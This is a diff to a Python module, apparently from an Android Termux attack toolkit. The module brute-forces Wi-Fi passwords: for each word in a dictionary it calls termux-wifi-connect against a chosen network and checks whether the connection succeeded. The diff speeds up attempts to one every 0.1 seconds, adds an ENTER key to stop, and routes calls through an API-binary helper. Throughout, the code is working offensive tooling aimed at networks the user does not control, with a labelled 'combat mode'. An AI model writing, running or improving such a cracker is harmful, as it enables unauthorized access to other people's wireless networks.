@@ -5,7 +5,8 @@ modules.attack.wifi_crack — Подбор пароля от Wi-Fi.
 Механика:
   • пользователь выбирает цель (сеть) и словарь;
   • каждый пароль из словаря проверяется подключением к сети,
-    шаг подбора — каждые 0.5 секунды;
+    шаг подбора — каждые 0.1 секунды;
+  • нажатие ENTER в любой момент останавливает подбор и возвращает в меню;
   • при успехе пароль выводится и подбор останавливается.
 
 Словари лежат в папке wordlists/ проекта:
@@ -20,9 +21,11 @@ modules.attack.wifi_crack — Подбор пароля от Wi-Fi.
 
 import os
 import sys
+import threading
 import time
 
 from core.ui import C, header, pause
+from core.termuxapi import api_bin
 
 BASE_DIR = os.path.dirname(os.path.dirname(
     os.path.dirname(os.path.abspath(__file__))))
@@ -30,7 +33,7 @@ BASE_DIR = os.path.dirname(os.path.dirname(
 # Папка со словарями для подбора паролей
 WORDLISTS_DIR = os.path.join(BASE_DIR, "wordlists")
 
-DELAY = 0.5  # шаг подбора — каждые 0.5 секунды
+DELAY = 0.1  # шаг подбора — каждые 0.1 секунды
 
 DICTIONARIES = [
     ("1. Подбор из цифр (Easy pass)", "pn_e00001.txt"),
@@ -50,13 +53,13 @@ def _get_targets():
     """Возвращает список доступных Wi-Fi сетей через Termux:API:
     [(ssid, secure), ...]."""
     import json
-    import shutil as _sh
     import subprocess
 
-    if _sh.which("termux-wifi-scaninfo") is None:
+    exe = api_bin("termux-wifi-scaninfo")
+    if exe is None:
         return []
     try:
-        out = subprocess.run(["termux-wifi-scaninfo"],
+        out = subprocess.run([exe],
                              capture_output=True, text=True,
                              timeout=15).stdout
         data = json.loads(out or "[]")
@@ -144,9 +147,8 @@ def _choose_dictionary():
 
 def _termux_connectable():
     """Есть ли Termux:API для реальной проверки паролей."""
-    import shutil as _sh
-    return (_sh.which("termux-wifi-connect") is not None
-            and _sh.which("termux-wifi-info") is not None)
+    return (api_bin("termux-wifi-connect") is not None
+            and api_bin("termux-wifi-info") is not None)
 
 
 def _try_connect(ssid, pwd):
@@ -155,19 +157,23 @@ def _try_connect(ssid, pwd):
     import json
     import subprocess
 
+    exe = api_bin("termux-wifi-connect")
+    if exe is None:
+        return False
     try:
-        subprocess.run(["termux-wifi-connect", "--ssid", ssid,
+        subprocess.run([exe, "--ssid", ssid,
                         "--pwd", pwd, "--type", "wpa2"],
                        stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                        text=True, timeout=15)
     except Exception:
         return False
     ok = False
+    info_exe = api_bin("termux-wifi-info")
     steps = max(1, int(DELAY * 10))
     for _ in range(steps):        # короткое ожидание статуса
         time.sleep(0.1)
         try:
-            out = subprocess.run(["termux-wifi-info"],
+            out = subprocess.run([info_exe],
                                  capture_output=True, text=True,
                                  timeout=5).stdout
             info = json.loads(out or "{}")
@@ -176,12 +182,14 @@ def _try_connect(ssid, pwd):
         if info.get("connected") and info.get("ssid") == ssid:
             ok = True
             break
-    try:                          # откат профиля, чтобы не остаться в сети
-        subprocess.run(["termux-wifi-forgetprofile", "--all"],
-                       stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
-                       text=True, timeout=10)
-    except Exception:
-        pass
+    forget = api_bin("termux-wifi-forgetprofile")
+    if forget:
+        try:                      # откат профиля, чтобы не остаться в сети
+            subprocess.run([forget, "--all"],
+                           stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
+                           text=True, timeout=10)
+        except Exception:
+            pass
     return ok
 
 
@@ -202,8 +210,31 @@ def _save_result(ssid, pwd, demo_note=False):
     print(f"{C.DIM}  Итог сохранён в logs/wifi_crack.log{C.RESET}")
 
 
+# ─────────────── остановка по ENTER ───────────────
+
+def _start_enter_stop():
+    """Фоновый наблюдатель: нажатие ENTER останавливает подбор.
+
+    Возвращает (threading.Event, msvcrt-режим|None). Событие установлено —
+    значит пользователь нажал Enter (или закрыл stdin).
+    """
+    stop = threading.Event()
+
+    def watch():
+        try:
+            sys.stdin.readline()      # блокируется до Enter / Ctrl+D
+        except Exception:
+            pass
+        stop.set()
+
+    t = threading.Thread(target=watch, daemon=True)
+    t.start()
+    return t, stop
+
+
 def run_attack(ssid, dict_path, demo=False):
-    """Основной цикл подбора: по одному паролю каждые 0.5 сек."""
+    """Основной цикл подбора: по одному паролю каждые 0.1 сек;
+    ENTER — остановить подбор и вернуться в меню."""
     passwords = []
     with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
         for line in f:
@@ -219,7 +250,7 @@ def run_attack(ssid, dict_path, demo=False):
     print(f"{C.BOLD}  📚 Словарь: {os.path.basename(dict_path)} · всего паролей: {total:,}".replace(',', ' ') + C.RESET)
     print(f"{C.BOLD}  ⏱  Шаг подбора: {DELAY} сек{C.RESET}")
     print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
-    print(f"{C.DIM}  Ctrl+C — остановить подбор.{C.RESET}\n")
+    print(f"{C.DIM}  ENTER — остановить подбор и выйти в меню · Ctrl+C — тоже стоп.{C.RESET}\n")
 
     real_mode = False
     if not demo:
@@ -231,14 +262,21 @@ def run_attack(ssid, dict_path, demo=False):
 
     start = time.time()
     found = None
+    stopped_by_user = False
+    _, stop = _start_enter_stop()
     try:
         for i, pwd in enumerate(passwords, 1):
+            if stop.is_set():
+                stopped_by_user = True
+                break
             ok = False
             if real_mode:
                 ok = _try_connect(ssid, pwd)
             else:
-                # демо: имитируем проверку с шагом 0.5 сек
-                time.sleep(DELAY)
+                # демо: имитируем проверку с шагом 0.1 сек
+                if stop.wait(DELAY):
+                    stopped_by_user = True
+                    break
 
             elapsed = time.time() - start
             speed = i / elapsed if elapsed > 0 else 0
@@ -259,21 +297,24 @@ def run_attack(ssid, dict_path, demo=False):
             if real_mode:
                 target_time = start + i * DELAY
                 now = time.time()
-                if now < target_time:
-                    time.sleep(target_time - now)
+                if now < target_time and stop.wait(target_time - now):
+                    stopped_by_user = True
+                    break
     except KeyboardInterrupt:
-        print(f"\n\n{C.YELLOW}  ⛔ Подбор остановлен пользователем.{C.RESET}")
+        stopped_by_user = True
 
     print()
+    if stopped_by_user:
+        print(f"\n{C.YELLOW}  ⛔ Подбор остановлен (ENTER) — возврат в меню.{C.RESET}")
     if found:
         print(f"\n{C.GREEN}{C.BOLD}  ✔ ПАРОЛЬ НАЙДЕН: {found}{C.RESET}")
         _save_result(ssid, found)
-    elif not real_mode:
+    elif not real_mode and not stopped_by_user:
         print(f"\n{C.DIM}  Демо-прогон завершён: реальных подключений не выполнялось."
               f"\n  Для боевого режима установите Termux:API (pkg install termux-api"
               f"\n  + приложение Termux:API из F-Droid).{C.RESET}")
         _save_result(ssid, None, demo_note=True)
-    else:
+    elif not stopped_by_user:
         print(f"\n{C.RED}  ✖ Пароль не найден (словарь исчерпан).{C.RESET}")
         _save_result(ssid, None)
 
